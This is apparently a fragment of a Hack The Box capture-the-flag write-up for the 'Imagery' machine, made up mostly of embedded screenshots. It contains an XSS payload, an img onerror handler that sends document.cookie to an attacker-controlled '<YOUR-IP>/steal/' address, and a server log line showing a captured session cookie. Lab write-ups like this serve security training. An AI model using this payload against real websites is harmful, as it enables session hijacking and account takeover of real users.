
![[IMG-20260123023119444.png]]

![[Assets/Write up/Hack The Box/Boxe/Imagery/IMG-20260123023119498.png]]

Payload: 
```javascript
<img src=1 onerror="document.location='http://<YOUR-IP>/steal/'+ document.cookie">
```
![[IMG-20260123023120354.png]]
```bash
10.10.11.88 - - [20/Oct/2025 01:59:12] "GET /session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aPV7TA.5f9IJS6TqVJVOBtjrOaf32LME_k HTTP/1.1" 404 -
```

![[IMG-20260123023121378.png]]

![[IMG-20260123023122137.png]]

![[IMG-20260123023122664.png]]

![[IMG-20260123023123300.png]]



